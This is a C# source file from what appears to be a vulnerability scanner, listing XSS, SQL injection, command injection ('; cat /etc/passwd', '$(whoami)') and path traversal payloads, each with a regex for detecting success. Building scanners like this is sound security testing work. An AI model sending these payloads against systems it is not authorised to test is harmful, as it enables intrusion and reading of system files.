using BlazeCannon.Core.Models;

namespace BlazeCannon.Scanner;

public static class PayloadRepository
{
    public static IReadOnlyList<PayloadDefinition> GetAll() => AllPayloads;

    public static IReadOnlyList<PayloadDefinition> GetByCategory(string category)
        => AllPayloads.Where(p => p.Category.Equals(category, StringComparison.OrdinalIgnoreCase)).ToList();

    private static readonly List<PayloadDefinition> AllPayloads = new()
    {
        // XSS Payloads
        new() { Name = "Script Tag", Category = "XSS", Payload = "<script>alert('XSS')</script>", ExpectedEvidence = @"<script>alert\('XSS'\)</script>", Description = "Basic script injection" },
        new() { Name = "Img Onerror", Category = "XSS", Payload = "<img src=x onerror=alert('XSS')>", ExpectedEvidence = @"onerror=alert", Description = "Image error handler XSS" },
        new() { Name = "SVG Onload", Category = "XSS", Payload = "<svg/onload=alert('XSS')>", ExpectedEvidence = @"onload=alert", Description = "SVG onload event XSS" },
        new() { Name = "Body Onload", Category = "XSS", Payload = "<body onload=alert('XSS')>", ExpectedEvidence = @"onload=alert", Description = "Body onload event XSS" },
        new() { Name = "Quote Break Script", Category = "XSS", Payload = "\"><script>alert('XSS')</script>", ExpectedEvidence = @"<script>alert", Description = "Attribute escape into script" },
        new() { Name = "Single Quote Script", Category = "XSS", Payload = "'><script>alert('XSS')</script>", ExpectedEvidence = @"<script>alert", Description = "Single quote attribute escape" },
        new() { Name = "Details Toggle", Category = "XSS", Payload = "<details/open/ontoggle=alert('XSS')>", ExpectedEvidence = @"ontoggle=alert", Description = "Details element toggle XSS" },
        new() { Name = "Event Handler", Category = "XSS", Payload = "<div onmouseover=alert('XSS')>hover</div>", ExpectedEvidence = @"onmouseover=alert", Description = "Mouse event handler XSS" },

        // SQL Injection Payloads
        new() { Name = "OR True", Category = "SQLi", Payload = "' OR '1'='1", ExpectedEvidence = @"(?i)(welcome|admin|logged|dashboard|multiple|rows)", Description = "Classic OR-based bypass" },
        new() { Name = "OR True Comment", Category = "SQLi", Payload = "' OR '1'='1' --", ExpectedEvidence = @"(?i)(welcome|admin|logged|dashboard)", Description = "OR bypass with comment" },
        new() { Name = "Union Null", Category = "SQLi", Payload = "' UNION SELECT null,null,null --", ExpectedEvidence = @"(?i)(error|union|column|null)", Description = "UNION-based column discovery" },
        new() { Name = "Order By", Category = "SQLi", Payload = "1' ORDER BY 1--", ExpectedEvidence = @"(?i)(error|order)", Description = "ORDER BY column enumeration" },
        new() { Name = "Boolean True", Category = "SQLi", Payload = "' AND 1=1 --", ExpectedEvidence = @"(?i)(found|exists|true|result)", Description = "Boolean-based true test" },
        new() { Name = "Boolean False", Category = "SQLi", Payload = "' AND 1=2 --", ExpectedEvidence = @"(?i)(not found|no result|false|empty)", Description = "Boolean-based false test" },
        new() { Name = "Error Based", Category = "SQLi", Payload = "' AND 1=CONVERT(int,(SELECT @@version))--", ExpectedEvidence = @"(?i)(error|convert|version|microsoft|sqlite)", Description = "Error-based version extraction" },
        new() { Name = "Stacked Query", Category = "SQLi", Payload = "'; SELECT sqlite_version();--", ExpectedEvidence = @"(?i)(error|sqlite|version|\d+\.\d+)", Description = "Stacked query attempt" },

        // Command Injection Payloads
        new() { Name = "Semicolon Whoami", Category = "CommandInjection", Payload = "; whoami", ExpectedEvidence = @"(?i)(root|admin|www-data|user|nt authority)", Description = "Semicolon chained whoami" },
        new() { Name = "Pipe Whoami", Category = "CommandInjection", Payload = "| whoami", ExpectedEvidence = @"(?i)(root|admin|www-data|user|nt authority)", Description = "Pipe to whoami" },
        new() { Name = "And Whoami", Category = "CommandInjection", Payload = "&& whoami", ExpectedEvidence = @"(?i)(root|admin|www-data|user|nt authority)", Description = "AND chained whoami" },
        new() { Name = "Backtick Whoami", Category = "CommandInjection", Payload = "`whoami`", ExpectedEvidence = @"(?i)(root|admin|www-data|user|nt authority)", Description = "Backtick command substitution" },
        new() { Name = "Dollar Whoami", Category = "CommandInjection", Payload = "$(whoami)", ExpectedEvidence = @"(?i)(root|admin|www-data|user|nt authority)", Description = "Dollar command substitution" },
        new() { Name = "Semicolon Passwd", Category = "CommandInjection", Payload = "; cat /etc/passwd", ExpectedEvidence = @"root:.*:0:0", Description = "Read /etc/passwd" },
        new() { Name = "Pipe Id", Category = "CommandInjection", Payload = "| id", ExpectedEvidence = @"uid=\d+", Description = "Pipe to id command" },
        new() { Name = "Amp Dir", Category = "CommandInjection", Payload = "& dir", ExpectedEvidence = @"(?i)(volume|directory|<dir>)", Description = "Windows dir command" },

        // Path Traversal Payloads
        new() { Name = "Linux Passwd", Category = "PathTraversal", Payload = "../../../etc/passwd", ExpectedEvidence = @"root:.*:0:0", Description = "Linux /etc/passwd traversal" },
        new() { Name = "Windows Win.ini", Category = "PathTraversal", Payload = @"..\..\..\..\windows\win.ini", ExpectedEvidence = @"\[fonts\]", Description = "Windows win.ini traversal" },
        new() { Name = "Double Slash", Category = "PathTraversal", Payload = "....//....//etc/passwd", ExpectedEvidence = @"root:.*:0:0", Description = "Double-slash bypass traversal" },
        new() { Name = "URL Encoded", Category = "PathTraversal", Payload = "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", ExpectedEvidence = @"root:.*:0:0", Description = "URL-encoded traversal" },
        new() { Name = "Double URL Encoded", Category = "PathTraversal", Payload = "..%252f..%252f..%252fetc%252fpasswd", ExpectedEvidence = @"root:.*:0:0", Description = "Double URL-encoded traversal" },
    };
}
